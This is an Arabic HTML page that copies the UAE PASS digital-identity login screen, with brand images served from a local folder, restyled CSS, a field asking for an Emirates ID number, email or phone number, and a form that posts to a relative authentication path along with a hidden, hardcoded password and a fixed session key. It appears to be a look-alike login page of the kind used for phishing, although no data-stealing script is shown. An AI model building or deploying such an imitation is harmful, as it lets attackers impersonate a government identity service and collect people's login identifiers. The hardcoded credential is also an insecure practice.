<!doctype html>
<html lang="ar">
<head dir="rtl">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />

    <link rel="shortcut icon" type="image/ico" href="uaepass/images/favicon.ico">
    <link rel="stylesheet" type="text/css" href="uaepass/css/bootstrap.css">
    <link rel="stylesheet" type="text/css" href="uaepass/css/loginStylesheet.css?2">
    <link rel="icon" href="uaepass/images/favicon.ico" type="image/ico"/>

    <title>UAE PASS</title>
    <style>
    /* 1. إعدادات المتغيرات والألوان الأساسية */
    :root {
        --uae-blue-dark: #005a9c;
        --uae-blue-light: #00a19c;
        --uae-black: #1a1a1a;
        --uae-gray-bg: #f9f9f9;
        --uae-border: #d1d1d1;
        --uae-text-muted: #666666;
    }

    /* 2. التنسيقات العامة للجسم */
    body {
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
        background-color: #ffffff;
        margin: 0;
        padding: 0;
        direction: rtl; /* لضمان التنسيق العربي الصحيح */
    }

    /* 3. الشريط الملون في أعلى الصفحة */
    .rectangle {
        height: 6px;
        background: linear-gradient(90deg, var(--uae-blue-dark), var(--uae-blue-light));
        width: 100%;
        position: fixed;
        top: 0;
        left: 0;
        z-index: 9999;
    }

    /* 4. الحاوية الرئيسية */
    .container {
        max-width: 450px;
        margin: 0 auto;
        padding: 40px 15px;
    }

    /* 5. شعار الهوية الرقمية */
    .logo img {
        max-width: 180px;
        height: auto;
        margin-bottom: 20px;
    }

    .login-to-uaepass p {
        font-size: 20px;
        font-weight: 700;
        color: var(--uae-black);
        margin-bottom: 30px;
    }

    .login-to-uaepass span {
        color: var(--uae-blue-dark);
    }

    /* 6. تنسيق حقل الإدخال (Input) */
    .idn-input {
        width: 100%;
        padding: 15px 20px;
        border: 1px solid var(--uae-border);
        border-radius: 8px;
        font-size: 14px;
        background-color: var(--uae-gray-bg);
        box-sizing: border-box;
        transition: all 0.3s ease;
        text-align: right;
    }

    .idn-input:focus {
        border-color: var(--uae-blue-dark);
        background-color: #fff;
        outline: none;
        box-shadow: 0 0 0 3px rgba(0, 90, 156, 0.1);
    }

    /* 7. زر تسجيل الدخول الأسود */
    .btn-login {
        width: 100%;
        background-color: var(--uae-black);
        color: #ffffff;
        border: none;
        padding: 14px;
        border-radius: 8px;
        font-size: 16px;
        font-weight: 600;
        cursor: pointer;
        margin-top: 25px;
        transition: background 0.3s ease;
    }

    .btn-login:hover {
        background-color: #333333;
    }

    /* 8. الروابط والنصوص الجانبية */
    .dont-have-account {
        font-size: 14px;
        color: var(--uae-text-muted);
    }

    .create-new-account {
        color: var(--uae-blue-dark);
        text-decoration: none;
        font-weight: bold;
    }

    .recover-account {
        color: var(--uae-text-muted);
        font-size: 13px;
        text-decoration: underline;
        margin-top: 15px;
        display: inline-block;
    }

    /* 9. تذييل الصفحة (Footer) */
    .footer {
        margin-top: 50px;
        padding-top: 20px;
        border-top: 1px solid #eeeeee;
        text-align: center;
    }

    .ids-logo {
        max-width: 120px;
        margin-bottom: 15px;
    }

    .path {
        height: 1px;
        background-color: #eee;
        margin-bottom: 15px;
    }

    .menu {
        font-size: 12px;
        color: var(--uae-blue-dark);
        text-decoration: none;
        margin: 0 8px;
        display: inline-block;
    }

    .copyright {
        font-size: 11px;
        color: #999;
        margin-top: 15px;
    }

    /* 10. تعديلات للشاشات الصغيرة */
    @media (max-width: 576px) {
        .container {
            padding-top: 60px;
        }
        .menu {
            margin: 5px;
            font-size: 11px;
        }
    }
</style>
</head>

<body>
    <div dir="rtl">
        <div class="rectangle"></div>
        <div class="container" style="padding-top:60px;">
            <div class="row">
                <div class="col" style="text-align: center">
                    <a class="logo" href="https://www.uaepass.ae" target="_blank">
                        <img src="uaepass/images/self_service.png" onerror="this.src='uaepass/images/self_service.png';">
                    </a>
                </div>
            </div>
            <div class="row">
                <div class="col" style="text-align: center">
                    <div class="login-to-uaepass">
                        <p>الدخول عن طريق <span>الهوية الرقمية</span></p>
                    </div>
                </div>
            </div>

            <div class="row">
                <div class="col" style="text-align: center">
                    <div class="login-content m-auto pt-2">
                        <form id="loginForm" action="../../commonauth" method="post" class="authenticationForm form-horizontal" enctype="application/x-www-form-urlencoded" autocomplete="off">
                            <div class="form-group" style="margin-bottom: 0.5rem;">
                                <input type="text" autofocus="" class="form-control form-control-lg form-input idn-input"
                                       id="username" name="username" placeholder="رقم الهوية، البريد الإلكتروني، أو رقم الهاتف. مثال: 971500000000"
                                       spellcheck="false" autocomplete="off" value=''>
                            </div>
                                                    
                            <div align="left" class="form-check top-10">
                                <input type="checkbox" checked="checked" class="form-check-input" name="rememberme" value="1" id="rememberme"> 
                                <label class="dont-have-account" for="rememberme"> تذكرني</label>
                            </div>
                        
                            <div class="form-group-button">
                                <input type="hidden" name="iid" value="1">
                                <input id="basicPasswordForm-submitButton" type="submit" name="basicPasswordForm-submitButton" value="تسجيل الدخول" class="btn-login" />
                            </div>

                            <input id="tocommonauth" name="tocommonauth" type="hidden" value="true">
                            <input id="password" name="password" type="hidden" value="ndwenw902ee9239">
                            <input type="hidden" id="sessionDataKey" name="sessionDataKey" value='5b97084d-a443-4984-a417-63fdee833691'/>
                        </form>
                        <hr>
                        <div class="row">
                            <div class="col" style="padding-bottom: 10px;">
                                <p style="margin-bottom: 0;" class="dont-have-account">
                                    ليس لديك حساب في الهوية الرقمية؟
                                    <a class="create-new-account" href="https://uaepass.ae/signup" target="_blank">&nbsp;إنشاء حساب جديد</a>
                                </p>
                            </div>
                        </div>
                        <div class="row justify-content-center">
                            <div class="col-auto" style="TEXT-ALIGN: center">
                                <div>
                                    <a class="recover-account" href="https://uaepass.ae/account-recovery" target="_blank"> كيفية استعادة الحساب؟</a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <footer class="footer">
                <div class="row">
                    <div class="col">
                        <img class="ids-logo" style="margin-left: 40px; margin-bottom: 8px" src="uaepass/images/n6.png" />
                    </div>
                </div>
                <div class="row justify-content-center pl-5 pr-5">
                    <div class="col-sm-12">
                        <div class="path"></div>
                    </div>
                </div>
                <div class="row">
                    <div class="col">
                        <div class="text-center">
                            <a class="menu" href="https://uaepass.ae">الصفحة الرئيسية</a>
                            <a class="menu" href="https://uaepass.ae/about">نبذة عامة</a>
                            <a class="menu" href="https://uaepass.ae/support">الدعم</a>
                            <a class="menu" href="https://uaepass.ae/faq">الأسئلة الشائعة</a>
                            <a class="menu" href="https://uaepass.ae/locations">مواقع منافذ الخدمة</a>
                            <a class="menu" href="https://uaepass.ae/service-provider">مزودو الخدمات</a>
                        </div>
                        <div class="copyright text-center">حقوق النشر © 2025 الهوية الرقمية جميع الحقوق محفوظة.</div>
                    </div>
                </div>
            </footer>
        </div>
    </div>
</body>
</html>
